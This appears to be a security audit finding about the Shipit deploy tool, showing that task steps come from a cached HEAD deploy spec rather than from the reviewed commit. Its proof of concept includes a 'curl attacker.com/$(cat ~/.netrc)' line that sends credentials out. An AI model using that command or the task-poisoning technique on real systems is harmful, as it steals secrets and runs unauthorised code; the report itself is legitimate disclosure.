### Title
Task steps executed come from the cached HEAD deploy spec, not from the reviewed commit checked out to run them - ([File: app/models/shipit/stack.rb])

### Summary
`Stack#trigger_task` resolves the `TaskDefinition` (and therefore the `steps` that will be shell-executed) from `find_task_definition`, which delegates to `cached_deploy_spec` — a spec computed by `CacheDeploySpecJob` from the *latest reachable commit* of the branch. The commit that is actually checked out into the working directory the task runs in (`until_commit`/`since_commit`) is `last_deployed_commit`, a different, already-reviewed/deployed commit. This breaks the binding "the ref a user approved to run a task against" = "the ref whose `shipit.yml` steps actually execute."

### Finding Description
`Stack#trigger_task` does:
```ruby
def trigger_task(definition_id, user, env: nil, force: false)
  definition = find_task_definition(definition_id)
  ...
  commit = last_deployed_commit.presence || commits.first
  task = tasks.create(
    ...
    until_commit_id: commit.id,
    since_commit_id: commit.id,
    ...
  )
``` [1](#0-0) 

`find_task_definition` is delegated to `cached_deploy_spec`: [2](#0-1) 

`cached_deploy_spec` is refreshed asynchronously by `CacheDeploySpecJob`, which always checks out the *newest reachable commit* of the stack (`stack.commits.reachable.last`), not any specific reviewed/deployed commit:
```ruby
def perform(stack)
  return if stack.inaccessible?
  commit = stack.commits.reachable.last
  ...
  stack.update!(cached_deploy_spec: DeploySpec::FileSystem.new(path, stack))
end
``` [3](#0-2) 

The resulting `TaskDefinition` object (including its `steps` array) is serialized directly onto the `Task` record at creation time: [4](#0-3) [5](#0-4) 

At execution time, `TaskCommands#steps` returns `@task.definition.steps` — the snapshot taken from the HEAD-based cached spec — while the actual working directory that gets checked out (via `TaskCommands#checkout` and `clone`) uses the *task's* `until_commit` (i.e., `last_deployed_commit`): [6](#0-5) 

So: a user who authorizes a named task (e.g. `restart`, `console`) against the reviewed/deployed commit is trusting the deploy that was actually reviewed and shipped. But the shell command list that is spawned (`steps`) is instead pulled from whatever `shipit.yml` exists at the current HEAD of the branch — which can include unreviewed, unmerged-into-deploy commits (e.g. open PRs merged to the tracked branch but not yet deployed, or direct pushes if branch protection allows it). Anyone able to land a commit on the tracked branch (which is a much lower bar than "get a commit deployed", since deploys usually require CI/checklist/manual approval flows enforced independently) can rewrite a task's `steps:` to arbitrary shell commands; the next time any user triggers that task id, Shipit runs the attacker-controlled steps inside the deploy host's working tree/environment (with `GIT_COMMITTER_*`, deploy secrets, and `GITHUB_TOKEN`/API creds available to `TaskCommands#env`, see `lib/shipit/task_commands.rb` lines 33-48) even though the visible/checked-out commit is the safe, already-deployed one.

This is the same "aggregate acted upon differs from the individual scoped item" bug class as the `Den` NATIVE_TYPE report: the artifact that was vetted/approved (`last_deployed_commit`) is not the artifact whose logic (`steps`) actually executes.

### Impact Explanation
This allows escalation to arbitrary command execution on the deploy host using the app's own git remote/credentials, without going through the deploy approval/CI gating that stacks are supposed to enforce for code that runs against them — an unauthorized "deploy"-equivalent action (arbitrary shell steps run with deploy environment, including `GITHUB_TOKEN`/API tokens configured in `TaskCommands#env`). This matches the "Critical: RCE on the deploy host" / unauthorized deploy category.

### Likelihood Explanation
Likelihood is Low/Medium: it requires an attacker capable of landing a commit reachable by the stack's tracked branch (e.g. via a merge queue misconfiguration, a lower-trust branch protection setting, or a compromised/lower-privileged contributor who can push to the branch but not trigger/approve deploys) and requires another (potentially higher-privileged) user to subsequently trigger an existing named task. No `webhook_secret`, `ApiClient` token, or admin session is needed by the attacker — only branch write access, distinct from deploy-trigger privilege.

### Recommendation
Resolve and pin the `TaskDefinition` used for execution against the exact commit the task is scoped to run against (`until_commit`), not the async-cached HEAD spec. Concretely, `TaskCommands#steps` should load the task's `steps` from `DeploySpec::FileSystem.new(@task.working_directory, @stack)` (the spec of the checked-out commit) rather than trusting `@task.definition.steps`, or `Stack#trigger_task` should compute `definition` from the spec of the commit that will actually be checked out rather than from `cached_deploy_spec`.

### Proof of Concept
1. Attacker gets a commit merged/pushed onto the stack's tracked branch (reachable HEAD) that modifies `shipit.yml`'s `tasks.<id>.steps` to `curl attacker.com/$(cat ~/.netrc) ...` or any arbitrary shell command, without that commit being deployed/approved.
2. `GithubSyncJob`/`CacheDeploySpecJob` runs, updating `stack.cached_deploy_spec` from this new HEAD commit: [3](#0-2) .
3. A legitimate user (unaware of the change) triggers the existing task id (e.g. `restart`) via `TasksController#create` → `Stack#trigger_task`, which resolves `definition = find_task_definition(definition_id)` from the now-poisoned `cached_deploy_spec`: [7](#0-6) .
4. The task record persists this poisoned `TaskDefinition` (with attacker's `steps`).
5. `PerformTaskJob` runs `TaskCommands#perform`, which builds `Command.new(command_line, ...)` for each `steps` entry — the attacker's payload — and executes it with the task's environment (including any configured `GITHUB_TOKEN`/secrets), inside the working directory checked out at `last_deployed_commit`: [8](#0-7) .

### Citations

**File:** app/models/shipit/stack.rb (L107-117)
```ruby
    delegate(
      :provisioning_handler_name,
      :find_task_definition,
      :release_status?,
      :release_status_context,
      :release_status_delay,
      :supports_fetch_deployed_revision?,
      :supports_rollback?,
      to: :cached_deploy_spec,
      allow_nil: true
    )
```

**File:** app/models/shipit/stack.rb (L139-159)
```ruby
    def trigger_task(definition_id, user, env: nil, force: false)
      definition = find_task_definition(definition_id)
      env = env.to_h

      definition.variables_with_defaults.each do |variable|
        env[variable.name] ||= variable.default
      end

      commit = last_deployed_commit.presence || commits.first
      task = tasks.create(
        user_id: user.id,
        definition:,
        until_commit_id: commit.id,
        since_commit_id: commit.id,
        env: definition.filter_envs(env),
        allow_concurrency: definition.allow_concurrency? || force,
        ignored_safeties: force
      )
      task.enqueue
      task
    end
```

**File:** app/jobs/shipit/cache_deploy_spec_job.rb (L16-23)
```ruby
    def perform(stack)
      return if stack.inaccessible?

      commit = stack.commits.reachable.last
      commands = Commands.for(stack)
      commands.with_temporary_working_directory(commit:, recursive: false) do |path|
        stack.update!(cached_deploy_spec: DeploySpec::FileSystem.new(path, stack))
      end
```

**File:** app/models/shipit/task_definition.rb (L22-34)
```ruby
    attr_reader :id, :action, :description, :steps, :checklist, :variables
    alias to_param id

    def initialize(id, config)
      @id = id
      @action = config['action']
      @description = config['description'] || ''
      @steps = config['steps'] || []
      @variables = task_variables(config['variables'] || [])
      @checklist = config['checklist'] || []
      @allow_concurrency = config['allow_concurrency'] || false
      @title = config['title']
    end
```

**File:** app/models/shipit/task.rb (L62-62)
```ruby
    serialize :definition, coder: TaskDefinition
```

**File:** lib/shipit/task_commands.rb (L23-59)
```ruby
    def perform
      steps.map do |command_line|
        Command.new(command_line, env:, chdir: steps_directory)
      end
    end

    def steps
      @task.definition.steps
    end

    def env
      super
        .merge(@stack.env)
        .merge(
          'SHIPIT_USER' => "#{@task.author.login} (#{normalized_author_name}) via Shipit",
          'EMAIL' => @task.author.email,
          'BUNDLE_PATH' => Rails.root.join('data', 'bundler').to_s,
          'SHIPIT_LINK' => @task.permalink,
          'TASK_ID' => @task.id.to_s,
          'IGNORED_SAFETIES' => @task.ignored_safeties? ? '1' : '0',
          'GIT_COMMITTER_NAME' => @task.user&.name || Shipit.committer_name,
          'GIT_COMMITTER_EMAIL' => @task.user&.email || Shipit.committer_email
        )
        .merge(deploy_spec.machine_env)
        .merge(@task.env)
    end

    def checkout(commit)
      git(
        '-c',
        'advice.detachedHead=false',
        'checkout',
        '--quiet',
        commit.sha,
        chdir: @task.working_directory
      )
    end
```
